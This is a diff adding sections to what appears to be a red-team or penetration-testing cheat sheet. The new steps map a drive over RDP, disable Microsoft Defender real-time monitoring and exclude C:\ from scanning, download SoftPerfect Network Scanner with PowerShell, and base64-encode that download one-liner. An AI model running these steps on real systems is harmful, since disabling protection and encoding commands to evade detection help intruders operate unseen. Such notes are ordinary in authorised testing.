@@ -62,5 +62,47 @@ $ ssh-keygen -t ed25519 -f ./unprotected -q -N '""'
 PS > scp -o StrictHostKeyChecking=no -i <ssh private key> -P <remote port> <path to file> <username>@<fqdn>:[remote path]
 ```
 
+### Map share drive through Remote Desktop session
+
+```shell 
+/usr/bin/xfreerdp /v:<host> /u:<username> /dynamic-resolution /p:<password> /drive:<share name>,<local share path> /sec:[tls,nla]
+```
+
+### Handle Microsoft Defender
+
+```powershell
+PS > Add-MpPreference -ExclusionPath 'C:\' 
+PS > Add-MpPreference -ExclusionPath '\\tsclient\'
+PS > Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+### Get SoftPerfect Network Scanner
+
+Commands to execute one line at a time
+
+```powershell
+PS > $tmp = New-TemporaryFile | Rename-Item -NewName { $_ -replace 'tmp$', 'zip' } -PassThru
+PS > (New-Object Net.WebClient).DownloadFile("https://www.softperfect.com/download/files/netscan_portable.zip",$tmp.FullName)
+PS > $tmp | Expand-Archive -DestinationPath . -Force
+PS > remove-item $tmp
+
+PS > https://www.softperfect.com/download/files/netscan_portable.zip
+PS > Expand-Archive -Path Draftv2.zip -DestinationPath C:\Reference
+```
+
+One liner
+
+```powershell
+PS > $tmp = New-TemporaryFile | Rename-Item -NewName { $_ -replace 'tmp$', 'zip' } -PassThru; (New-Object Net.WebClient).DownloadFile('https://www.softperfect.com/download/files/netscan_portable.zip',$tmp); $tmp | Expand-Archive -DestinationPath . -Force; remove-item $tmp
+```
+
+Encode the one liner
+
+```powershell
+PS > $command = "$tmp = New-TemporaryFile | Rename-Item -NewName { $_ -replace 'tmp$', 'zip' } -PassThru;(New-Object Net.WebClient).DownloadFile('https://www.softperfect.com/download/files/netscan_portable.zip',$tmp);$tmp | Expand-Archive -DestinationPath . -Force;remove-item $tmp"
+PS > $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+PS > $encodedCommand = [Convert]::ToBase64String($bytes)
+```
+
 
 
